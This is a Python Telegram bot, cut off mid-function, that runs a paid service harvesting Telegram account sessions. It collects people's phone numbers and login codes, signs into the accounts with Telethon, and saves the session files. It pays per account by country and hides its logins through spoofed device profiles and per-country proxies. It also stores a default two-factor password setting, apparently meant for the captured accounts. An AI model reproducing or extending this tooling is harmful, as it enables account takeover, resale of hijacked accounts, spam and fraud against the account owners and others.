import telebot
import sqlite3
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PeerFloodError
from telethon.tl import functions
import asyncio
import threading
import os
import phonenumbers
from phonenumbers import geocoder, country_code_for_region
import pycountry
from telebot import types
from telebot.util import escape
import time
import re
import datetime
import secrets
import string
import random
from collections import Counter
import zipfile
import shutil
import logging
import requests
import hashlib
import json
from typing import Dict, List, Optional, Tuple

# ==================== CONFIGURATION ====================
API_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_ID = 123456789  # Your Admin ID
API_ID = 25403443
API_HASH = "79908b532fe9662404142fd94bf494ec"

# Channel Configuration
PRIVATE_CHANNEL_LINK = "https://t.me/+9M4KaQILn7FhNDY1"
PRIVATE_CHANNEL_ID = -1002926608627
PUBLIC_CHANNEL_USERNAME = "@telecatch"

# Group IDs
SESSION_GROUP_ID = -1003084355923
WITHDRAW_GROUP_ID = -1002999572063
SPAM_BOT = "@spambot"

# Financial Configuration
MIN_WITHDRAW = 2.0
USD_TO_TRX = 10.0
USD_TO_BDT = 117.0
USD_TO_PKR = 278.0

# Database and Files
DB_FILE = "session_bot.db"
SESSIONS_FOLDER = "sessions"
PROXIES_CONFIG_FILE = "proxies.json"

# Security
MAX_PASSWORD_ATTEMPTS = 3
LOCKOUT_DURATION = 3600  # 1 hour in seconds

# Language Support
LANGUAGES = {
    'en': 'English 🇺🇸',
    'zh': '中文 🇨🇳', 
    'ar': 'العربية 🇸🇦'
}

DEFAULT_LANGUAGE = 'en'

# Create necessary directories
if not os.path.exists(SESSIONS_FOLDER):
    os.makedirs(SESSIONS_FOLDER)

# ==================== LOGGING SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==================== PROXY MANAGEMENT ====================
class ProxyManager:
    def __init__(self, config_file: str):
        self.config_file = config_file
        self.proxies = self.load_proxies()
        
    def load_proxies(self) -> Dict:
        """Load proxies from JSON configuration file"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Error loading proxies: {e}")
                return {}
        return {}
    
    def save_proxies(self):
        """Save proxies to JSON file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.proxies, f, indent=2)
            return True
        except Exception as e:
            logger.error(f"Error saving proxies: {e}")
            return False
    
    def get_proxy(self, country_code: str) -> Optional[Dict]:
        """Get proxy configuration for a country"""
        return self.proxies.get(country_code.upper())
    
    def set_proxy(self, country_code: str, proxy_config: Dict):
        """Set proxy configuration for a country"""
        self.proxies[country_code.upper()] = proxy_config
        return self.save_proxies()
    
    def remove_proxy(self, country_code: str):
        """Remove proxy configuration for a country"""
        if country_code.upper() in self.proxies:
            del self.proxies[country_code.upper()]
            return self.save_proxies()
        return False

# Initialize Proxy Manager
proxy_manager = ProxyManager(PROXIES_CONFIG_FILE)

# ==================== PASSWORD SECURITY ====================
class PasswordManager:
    @staticmethod
    def hash_password(password: str) -> str:
        """Hash password using SHA-256"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    @staticmethod
    def verify_password(plain_password: str, hashed_password: str) -> bool:
        """Verify password against hash"""
        return PasswordManager.hash_password(plain_password) == hashed_password
    
    @staticmethod
    def generate_random_password(length: int = 8) -> str:
        """Generate random password"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

# ==================== DATABASE MANAGEMENT ====================
def init_db():
    """Initialize database with all required tables"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    # Users table with enhanced security
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            full_name TEXT,
            balance REAL DEFAULT 0,
            session_count INTEGER DEFAULT 0,
            verified_count INTEGER DEFAULT 0,
            unverified_count INTEGER DEFAULT 0,
            claimed_numbers TEXT DEFAULT "",
            pending_numbers TEXT DEFAULT "",
            join_date TEXT,
            language TEXT DEFAULT 'en',
            withdraw_password TEXT,
            password_attempts INTEGER DEFAULT 0,
            account_locked INTEGER DEFAULT 0,
            lock_until INTEGER DEFAULT 0
        )
    """)
    
    # Country rates table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS country_rates (
            country_code TEXT PRIMARY KEY,
            rate REAL NOT NULL,
            claim_time_seconds INTEGER NOT NULL,
            status TEXT NOT NULL DEFAULT "on",
            capacity INTEGER NOT NULL DEFAULT 10,
            usage_count INTEGER NOT NULL DEFAULT 0
        )
    """)
    
    # Used numbers table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS used_numbers (
            phone_number TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL
        )
    """)
    
    # Enhanced withdraw history
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS withdraw_history (
            withdraw_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            amount REAL NOT NULL,
            address TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            trans_no TEXT,
            transaction_id TEXT,
            currency TEXT,
            status TEXT DEFAULT 'pending',
            admin_notes TEXT
        )
    """)
    
    # Admins table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY,
            role TEXT DEFAULT 'admin'
        )
    """)
    
    # Settings table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    
    # User sessions table for tracking
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_sessions (
            session_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            phone_number TEXT NOT NULL,
            country_code TEXT,
            status TEXT DEFAULT 'pending',
            created_at TEXT,
            completed_at TEXT
        )
    """)
    
    # Insert default data
    cursor.execute("INSERT OR IGNORE INTO admins (user_id, role) VALUES (?, ?)", (ADMIN_ID, 'superadmin'))
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('withdraw_status', 'on')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_status', 'on')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_password', 'TeleCatch2024!')")
    
    # Insert default country rates
    default_rates = [
        ("BD", 10.0, 30, "on", 20, 0),
        ("SA", 20.0, 60, "on", 15, 0),
        ("IN", 8.0, 20, "on", 25, 0),
        ("US", 25.0, 45, "on", 10, 0),
        ("TG", 15.0, 40, "on", 15, 0)
    ]
    
    for rate in default_rates:
        cursor.execute("INSERT OR IGNORE INTO country_rates VALUES (?, ?, ?, ?, ?, ?)", rate)
    
    conn.commit()
    conn.close()
    logger.info("Database initialized successfully")

def migrate_db():
    """Safe database migration"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        # Check and add new columns to users table
        columns_to_add = [
            ('language', 'TEXT DEFAULT "en"'),
            ('withdraw_password', 'TEXT'),
            ('password_attempts', 'INTEGER DEFAULT 0'),
            ('account_locked', 'INTEGER DEFAULT 0'),
            ('lock_until', 'INTEGER DEFAULT 0')
        ]
        
        cursor.execute("PRAGMA table_info(users)")
        existing_columns = [col[1] for col in cursor.fetchall()]
        
        for col_name, col_type in columns_to_add:
            if col_name not in existing_columns:
                cursor.execute(f"ALTER TABLE users ADD COLUMN {col_name} {col_type}")
                logger.info(f"Added column {col_name} to users table")
        
        # Check withdraw_history table for status column
        cursor.execute("PRAGMA table_info(withdraw_history)")
        withdraw_columns = [col[1] for col in cursor.fetchall()]
        if 'status' not in withdraw_columns:
            cursor.execute("ALTER TABLE withdraw_history ADD COLUMN status TEXT DEFAULT 'pending'")
        if 'admin_notes' not in withdraw_columns:
            cursor.execute("ALTER TABLE withdraw_history ADD COLUMN admin_notes TEXT")
        
        conn.commit()
        conn.close()
        logger.info("Database migration completed successfully")
        
    except Exception as e:
        logger.error(f"Migration error: {e}")
        init_db()

# Initialize database
init_db()
migrate_db()

# ==================== BOT INITIALIZATION ====================
bot = telebot.TeleBot(API_TOKEN, parse_mode='HTML')
user_data = {}

# ==================== LANGUAGE SYSTEM ====================
class LanguageManager:
    @staticmethod
    def get_user_language(user_id: int) -> str:
        """Get user's preferred language"""
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else DEFAULT_LANGUAGE
    
    @staticmethod
    def set_user_language(user_id: int, language_code: str):
        """Set user's preferred language"""
        if language_code not in LANGUAGES:
            return False
        
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (language_code, user_id))
        conn.commit()
        conn.close()
        return True
    
    @staticmethod
    def get_text(key: str, language: str = DEFAULT_LANGUAGE) -> str:
        """Get translated text (simplified implementation)"""
        texts = {
            'welcome': {
                'en': "🎉 Welcome to TeleCatch Session Manager\n\nPlease provide your phone number with country code.",
                'zh': "🎉 欢迎使用 TeleCatch 会话管理器\n\n请提供带有国家代码的电话号码。",
                'ar': "🎉 مرحباً بك في مدير جلسات TeleCatch\n\nيرجى تقديم رقم هاتفك مع رمز الدولة."
            },
            'withdraw_success': {
                'en': "✅ Withdrawal request submitted successfully",
                'zh': "✅ 提款请求已成功提交",
                'ar': "✅ تم تقديم طلب السحب بنجاح"
            },
            # Add more translations as needed
        }
        
        return texts.get(key, {}).get(language, texts.get(key, {}).get(DEFAULT_LANGUAGE, key))

# ==================== SECURITY FUNCTIONS ====================
def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

def check_account_lock(user_id: int) -> Tuple[bool, str]:
    """Check if account is locked due to password attempts"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT account_locked, lock_until FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        return False, ""
    
    locked, lock_until = result
    if locked and lock_until > time.time():
        remaining = int(lock_until - time.time())
        return True, f"Account locked. Please try again in {remaining//60} minutes."
    
    # Reset if lock expired
    if locked:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET account_locked = 0, password_attempts = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
    
    return False, ""

def verify_withdraw_password(user_id: int, password: str) -> Tuple[bool, str]:
    """Verify withdraw password with attempt tracking"""
    # Check account lock first
    locked, message = check_account_lock(user_id)
    if locked:
        return False, message
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT withdraw_password, password_attempts FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    if not result or not result[0]:
        conn.close()
        return False, "Withdraw password not set. Please use /setpassword first."
    
    stored_password, attempts = result
    
    if PasswordManager.verify_password(password, stored_password):
        # Reset attempts on success
        cursor.execute("UPDATE users SET password_attempts = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return True, "Password verified successfully."
    else:
        # Increment attempts
        new_attempts = attempts + 1
        cursor.execute("UPDATE users SET password_attempts = ? WHERE user_id = ?", (new_attempts, user_id))
        
        if new_attempts >= MAX_PASSWORD_ATTEMPTS:
            lock_until = time.time() + LOCKOUT_DURATION
            cursor.execute("UPDATE users SET account_locked = 1, lock_until = ? WHERE user_id = ?", (lock_until, user_id))
            conn.commit()
            conn.close()
            return False, f"Too many failed attempts. Account locked for {LOCKOUT_DURATION//60} minutes."
        
        conn.commit()
        conn.close()
        remaining = MAX_PASSWORD_ATTEMPTS - new_attempts
        return False, f"Invalid password. {remaining} attempts remaining."

def set_withdraw_password(user_id: int, password: str) -> bool:
    """Set withdraw password for user"""
    hashed_password = PasswordManager.hash_password(password)
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET withdraw_password = ?, password_attempts = 0, account_locked = 0 WHERE user_id = ?", 
                   (hashed_password, user_id))
    conn.commit()
    conn.close()
    return True

# ==================== CHANNEL VERIFICATION ====================
def check_channel_membership(user_id: int) -> bool:
    """Check if user is member of required channels"""
    try:
        # Check private channel
        try:
            member_private = bot.get_chat_member(PRIVATE_CHANNEL_ID, user_id)
            if member_private.status not in ['member', 'administrator', 'creator']:
                return False
        except:
            return False
        
        # Check public channel
        try:
            member_public = bot.get_chat_member(PUBLIC_CHANNEL_USERNAME, user_id)
            if member_public.status not in ['member', 'administrator', 'creator']:
                return False
        except:
            return False
        
        return True
    except Exception as e:
        logger.error(f"Channel check error: {e}")
        return False

def send_channel_join_message(chat_id: int):
    """Send channel join requirement message"""
    markup = types.InlineKeyboardMarkup()
    private_btn = types.InlineKeyboardButton("🔒 Private Channel", url=PRIVATE_CHANNEL_LINK)
    public_btn = types.InlineKeyboardButton("📢 Public Channel", url=f"https://t.me/{PUBLIC_CHANNEL_USERNAME[1:]}")
    markup.add(private_btn, public_btn)
    
    message = """
🚀 <b>Welcome to TeleCatch Session Manager</b>

To access all features, you need to join our channels:

• <b>Private Channel</b> - Exclusive sessions and updates
• <b>Public Channel</b> - Announcements and news

After joining both channels, click the button below to verify.
    """
    
    bot.send_message(chat_id, message, reply_markup=markup)

def channel_join_required(func):
    """Decorator to check channel membership"""
    def wrapper(message):
        if is_admin(message.from_user.id):
            func(message)
            return
            
        if check_channel_membership(message.from_user.id):
            func(message)
        else:
            send_channel_join_message(message.chat.id)
            
    return wrapper

# ==================== UTILITY FUNCTIONS ====================
def get_country_info(phone_number: str) -> Dict:
    """Get country information from phone number"""
    try:
        parsed_number = phonenumbers.parse(phone_number)
        country_code = geocoder.region_code_for_number(parsed_number)
        dial_code = parsed_number.country_code
        return {"code": country_code, "dial_code": dial_code, "valid": True}
    except Exception as e:
        logger.error(f"Phone number parsing error: {e}")
        return {"code": None, "dial_code": None, "valid": False}

def get_country_flag(country_code: str) -> str:
    """Get country flag emoji from country code"""
    if not country_code:
        return "🌍"
    try:
        return "".join(chr(ord(c) + 127397) for c in country_code.upper())
    except:
        return "🌍"

def generate_device_info():
    """Generate random device information"""
    devices = [
        {"model": "iPhone 14 Pro", "version": "iOS 17.1", "app": "10.5.5"},
        {"model": "Samsung Galaxy S23", "version": "Android 14", "app": "10.5.5"},
        {"model": "Google Pixel 7", "version": "Android 14", "app": "10.5.5"},
        {"model": "Xiaomi 13", "version": "Android 13", "app": "10.5.5"}
    ]
    device = random.choice(devices)
    return {
        "device_model": device["model"],
        "system_version": device["version"],
        "app_version": device["app"],
        "lang_code": "en"
    }

def generate_transaction_id() -> str:
    """Generate unique transaction ID"""
    return f"TC{int(time.time())}{random.randint(1000, 9999)}"

def format_balance_message(user_id: int, language: str = 'en') -> str:
    """Format balance information message"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance, verified_count, unverified_count FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        return "Account not found."
    
    balance, verified, unverified = result
    
    messages = {
        'en': f"""
💰 <b>Account Overview</b>

👤 <b>User ID:</b> <code>{user_id}</code>
✅ <b>Verified Sessions:</b> {verified}
⏳ <b>Pending Sessions:</b> {unverified}
💵 <b>Available Balance:</b> ${balance:.2f}

💳 <b>Minimum Withdrawal:</b> ${MIN_WITHDRAW:.2f}
        """,
        'zh': f"""
💰 <b>账户概览</b>

👤 <b>用户ID:</b> <code>{user_id}</code>
✅ <b>已验证会话:</b> {verified}
⏳ <b>待处理会话:</b> {unverified}
💵 <b>可用余额:</b> ${balance:.2f}

💳 <b>最低提款:</b> ${MIN_WITHDRAW:.2f}
        """,
        'ar': f"""
💰 <b>ملخص الحساب</b>

👤 <b>رقم المستخدم:</b> <code>{user_id}</code>
✅ <b>الجلسات المؤكدة:</b> {verified}
⏳ <b>الجلسات قيد الانتظار:</b> {unverified}
💵 <b>الرصيد المتاح:</b> ${balance:.2f}

💳 <b>الحد الأدنى للسحب:</b> ${MIN_WITHDRAW:.2f}
        """
    }
    
    return messages.get(language, messages['en'])

# ==================== TELEGRAM CLIENT FUNCTIONS ====================
async def create_telegram_client(phone_number: str, session_path: str):
    """Create Telegram client with appropriate proxy"""
    country_info = get_country_info(phone_number)
    country_code = country_info.get('code')
    proxy_config = proxy_manager.get_proxy(country_code) if country_code else None
    device_info = generate_device_info()
    
    return TelegramClient(
        session_path, 
        API_ID, 
        API_HASH,
        proxy=proxy_config,
        device_model=device_info["device_model"],
        system_version=device_info["system_version"],
        app_version=device_info["app_version"],
        lang_code=device_info["lang_code"]
    )

async def send_verification_code(chat_id: int, phone_number: str, message_id: int):
    """Send verification code to phone number"""
    try:
        session_filename = f"{SESSIONS_FOLDER}/{chat_id}_{phone_number}.session"
        client = await create_telegram_client(phone_number, session_filename)
        await client.connect()
        
        sent_code = await client.send_code_request(phone_number)
        
        # Store user data
        user_data[chat_id] = {
            "phone": phone_number,
            "phone_code_hash": sent_code.phone_code_hash,
            "session_file": session_filename,
            "state": "awaiting_code",
            "message_id": message_id
        }
        
        # Update database
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET unverified_count = unverified_count + 1 WHERE user_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        
        country_info = get_country_info(phone_number)
        flag = get_country_flag(country_info.get('code'))
        
        message = f"""
{flag} <b>Verification Code Sent</b>

📱 <b>Phone Number:</b> <code>{phone_number}</code>
🔐 <b>Status:</b> Code sent successfully

Please enter the 5-digit verification code you received.

Type /cancel to cancel this operation.
        """
        
        bot.edit_message_text(message, chat_id, message_id, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Error sending verification code: {e}")
        bot.edit_message_text(f"❌ Error sending code: {str(e)}", chat_id, message_id)
        if chat_id in user_data:
            del user_data[chat_id]

async def verify_code_and_create_session(chat_id: int, code: str):
    """Verify code and create session"""
    if chat_id not in user_data:
        return False, "Session expired. Please start again."
    
    data = user_data[chat_id]
    phone_number = data["phone"]
    
    try:
        client = await create_telegram_client(phone_number, data["session_file"])
        await client.connect()
        
        # Sign in with code
        await client.sign_in(phone_number, code, phone_code_hash=data["phone_code_hash"])
        
        # Check if 2FA is required
        if await client.is_user_authorized():
            # Process successful login
            await process_successful_session(client, chat_id, phone_number)
            return True, "Session created successfully!"
        else:
            return False, "Authentication failed. Please try again."
            
    except PhoneCodeInvalidError:
        return False, "Invalid verification code. Please check and try again."
    except PhoneCodeExpiredError:
        return False, "Verification code has expired. Please request a new code."
    except SessionPasswordNeededError:
        return False, "This account has 2FA enabled. Please disable it and try again."
    except Exception as e:
        logger.error(f"Session creation error: {e}")
        return False, f"Error: {str(e)}"

async def process_successful_session(client, chat_id: int, phone_number: str):
    """Process successful session creation"""
    try:
        # Get country info for rate calculation
        country_info = get_country_info(phone_number)
        country_code = country_info.get('code')
        
        # Get rate from database
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        if country_code:
            cursor.execute("SELECT rate, claim_time_seconds FROM country_rates WHERE country_code = ? AND status = 'on'", (country_code,))
            rate_info = cursor.fetchone()
        else:
            rate_info = None
        
        if rate_info:
            rate, claim_time = rate_info
            # Start auto-claim process
            threading.Timer(claim_time, lambda: run_async(auto_claim_session(chat_id, phone_number, rate))).start()
        
        # Update user statistics
        cursor.execute("""
            UPDATE users 
            SET verified_count = verified_count + 1, 
                unverified_count = unverified_count - 1 
            WHERE user_id = ?
        """, (chat_id,))
        conn.commit()
        conn.close()
        
        # Save session file
        session_path = os.path.join(SESSIONS_FOLDER, f"{phone_number}.session")
        if os.path.exists(user_data[chat_id]["session_file"]):
            shutil.copy(user_data[chat_id]["session_file"], session_path)
        
        # Send success message
        flag = get_country_flag(country_code)
        message = f"""
{flag} <b>Session Created Successfully!</b>

📱 <b>Phone Number:</b> <code>{phone_number}</code>
✅ <b>Status:</b> Verified and active

Your session has been created successfully. Balance will be added after confirmation period.
        """
        
        bot.edit_message_text(message, chat_id, user_data[chat_id]["message_id"], parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Session processing error: {e}")

async def auto_claim_session(user_id: int, phone_number: str, amount: float):
    """Auto-claim balance after confirmation period"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        # Add balance to user
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        
        # Add to claimed numbers
        cursor.execute("SELECT claimed_numbers FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        claimed_numbers = result[0] if result else ""
        new_claimed = f"{claimed_numbers},{phone_number}" if claimed_numbers else phone_number
        cursor.execute("UPDATE users SET claimed_numbers = ? WHERE user_id = ?", (new_claimed, user_id))
        
        # Update country usage
        country_info = get_country_info(phone_number)
        if country_info.get('code'):
            cursor.execute("UPDATE country_rates SET usage_count = usage_count + 1 WHERE country_code = ?", (country_info['code'],))
        
        conn.commit()
        conn.close()
        
        # Send notification to user
        message = f"""
💰 <b>Balance Added!</b>

📱 <b>Phone Number:</b> <code>{phone_number}</code>
💵 <b>Amount Added:</b> ${amount:.2f}
✅ <b>Status:</b> Successfully claimed

Your balance has been updated. Check with /account
        """
        
        bot.send_message(user_id, message, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Auto-claim error: {e}")

def run_async(async_func):
    """Run async function in thread"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(async_func)
    finally:
        loop.close()

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command"""
    user_id = message.from_user.id
    
    # Initialize user in database
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR IGNORE INTO users (user_id, full_name, join_date, language) 
        VALUES (?, ?, ?, ?)
    """, (user_id, message.from_user.first_name, datetime.datetime.now().isoformat(), DEFAULT_LANGUAGE))
    conn.commit()
    conn.close()
    
    # Check channel membership
    if not check_channel_membership(user_id):
        send_channel_join_message(message.chat.id)
        return
    
    # Send welcome message
    language = LanguageManager.get_user_language(user_id)
    welcome_text = LanguageManager.get_text('welcome', language)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('📱 Submit Phone Number', '💰 Account Balance')
    markup.add('🌍 Available Countries', '💳 Withdraw')
    markup.add('⚙️ Settings', '🆘 Help')
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['language'])
def handle_language(message):
    """Handle language selection"""
    markup = types.InlineKeyboardMarkup()
    for code, name in LANGUAGES.items():
        markup.add(types.InlineKeyboardButton(name, callback_data=f"setlang_{code}"))
    
    bot.send_message(message.chat.id, "🌍 <b>Select your language:</b>", reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['setpassword'])
def handle_set_password(message):
    """Handle password setup"""
    user_id = message.from_user.id
    user_data[user_id] = {'state': 'awaiting_password'}
    bot.send_message(message.chat.id, "🔐 <b>Set Withdrawal Password</b>\n\nPlease enter your new withdrawal password:", parse_mode='HTML')

@bot.message_handler(commands=['account'])
def handle_account(message):
    """Handle account balance check"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    message_text = format_balance_message(user_id, language)
    bot.send_message(message.chat.id, message_text, parse_mode='HTML')

@bot.message_handler(commands=['withdraw'])
def handle_withdraw(message):
    """Handle withdrawal request"""
    user_id = message.from_user.id
    
    # Check if withdraw is enabled
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = 'withdraw_status'")
    result = cursor.fetchone()
    conn.close()
    
    if result and result[0] == 'off':
        bot.send_message(message.chat.id, "❌ <b>Withdrawals are currently disabled.</b>", parse_mode='HTML')
        return
    
    # Check balance
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance, withdraw_password FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        bot.send_message(message.chat.id, "❌ <b>Account not found.</b>", parse_mode='HTML')
        return
    
    balance, has_password = result
    
    if balance < MIN_WITHDRAW:
        bot.send_message(message.chat.id, f"❌ <b>Minimum withdrawal is ${MIN_WITHDRAW:.2f}</b>\nYour balance: ${balance:.2f}", parse_mode='HTML')
        return
    
    if not has_password:
        bot.send_message(message.chat.id, "🔐 <b>Please set a withdrawal password first using /setpassword</b>", parse_mode='HTML')
        return
    
    # Ask for password
    user_data[user_id] = {'state': 'awaiting_withdraw_password', 'amount': balance}
    bot.send_message(message.chat.id, "🔐 <b>Withdrawal Authentication</b>\n\nPlease enter your withdrawal password:", parse_mode='HTML')

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all text messages"""
    user_id = message.from_user.id
    text = message.text.strip()
    
    # Check channel membership first
    if not check_channel_membership(user_id) and not is_admin(user_id):
        send_channel_join_message(message.chat.id)
        return
    
    # Handle based on user state
    if user_id in user_data:
        state = user_data[user_id].get('state')
        
        if state == 'awaiting_password':
            if set_withdraw_password(user_id, text):
                bot.send_message(message.chat.id, "✅ <b>Password set successfully!</b>", parse_mode='HTML')
            else:
                bot.send_message(message.chat.id, "❌ <b>Error setting password.</b>", parse_mode='HTML')
            del user_data[user_id]
            return
            
        elif state == 'awaiting_withdraw_password':
            success, msg = verify_withdraw_password(user_id, text)
            if success:
                # Proceed with withdrawal
                handle_withdraw_method_selection(user_id)
            else:
                bot.send_message(message.chat.id, f"❌ {msg}", parse_mode='HTML')
                if "locked" in msg:
                    del user_data[user_id]
            return
            
        elif state == 'awaiting_code':
            # Handle verification code
            if re.match(r'^\d{5}$', text):
                run_async(verify_code_and_create_session(user_id, text))
            else:
                bot.send_message(message.chat.id, "❌ <b>Please enter a valid 5-digit code.</b>", parse_mode='HTML')
            return
    
    # Handle phone number input
    if re.match(r'^\+\d{10,15}$', text):
        processing_msg = bot.send_message(message.chat.id, "⏳ <b>Processing your number...</b>", parse_mode='HTML')
        run_async(send_verification_code(user_id, text, processing_msg.message_id))
        return
    
    # Handle button responses
    if text == '📱 Submit Phone Number':
        bot.send_message(message.chat.id, "📱 <b>Please send your phone number with country code:</b>\n\nExample: +1234567890", parse_mode='HTML')
    elif text == '💰 Account Balance':
        handle_account(message)
    elif text == '🌍 Available Countries':
        handle_capacity(message)
    elif text == '💳 Withdraw':
        handle_withdraw(message)
    elif text == '⚙️ Settings':
        handle_settings(message)
    elif text == '🆘 Help':
        handle_help(message)
    else:
        handle_start(message)

def handle_withdraw_method_selection(user_id: int):
    """Handle withdrawal method selection"""
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("💳 LD Card", callback_data="withdraw_ld"),
        types.InlineKeyboardButton("₿ USDT (BEP20)", callback_data="withdraw_usdt")
    )
    bot.send_message(user_id, "💳 <b>Select Withdrawal Method:</b>", reply_markup=markup, parse_mode='HTML')

def handle_capacity(message):
    """Show available countries and rates"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT country_code, rate, claim_time_seconds, capacity, usage_count FROM country_rates WHERE status = 'on'")
    countries = cursor.fetchall()
    conn.close()
    
    if not countries:
        bot.send_message(message.chat.id, "❌ <b>No countries available at the moment.</b>", parse_mode='HTML')
        return
    
    message_text = "🌍 <b>Available Countries & Rates</b>\n\n"
    for country in countries:
        code, rate, time, capacity, usage = country
        flag = get_country_flag(code)
        try:
            country_name = pycountry.countries.get(alpha_2=code).name
        except:
            country_name = code
        
        available = capacity - usage
        message_text += f"{flag} <b>{country_name}</b>\n"
        message_text += f"   💰 Rate: ${rate:.2f}\n"
        message_text += f"   ⏱️ Time: {time}s\n"
        message_text += f"   📊 Available: {available}/{capacity}\n\n"
    
    bot.send_message(message.chat.id, message_text, parse_mode='HTML')

def handle_settings(message):
    """Show settings menu"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🌍 Change Language", callback_data="settings_language"))
    markup.add(types.InlineKeyboardButton("🔐 Change Password", callback_data="settings_password"))
    
    bot.send_message(message.chat.id, "⚙️ <b>Settings</b>", reply_markup=markup, parse_mode='HTML')

def handle_help(message):
    """Show help information"""
    help_text = """
🆘 <b>TeleCatch Bot Help</b>

<b>Basic Commands:</b>
/start - Start the bot
/account - Check your balance
/withdraw - Withdraw earnings
/language - Change language
/setpassword - Set withdrawal password

<b>How to Use:</b>
1. Send your phone number with country code
2. Receive and enter verification code
3. Wait for session confirmation
4. Earn balance automatically
5. Withdraw when you reach minimum

<b>Support:</b>
For issues, contact administrator.
    """
    bot.send_message(message.chat.id, help_text, parse_mode='HTML')

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    """Handle all callback queries"""
    user_id = call.from_user.id
    data = call.data
    
    if data.startswith('setlang_'):
        language = data.split('_')[1]
        if LanguageManager.set_user_language(user_id, language):
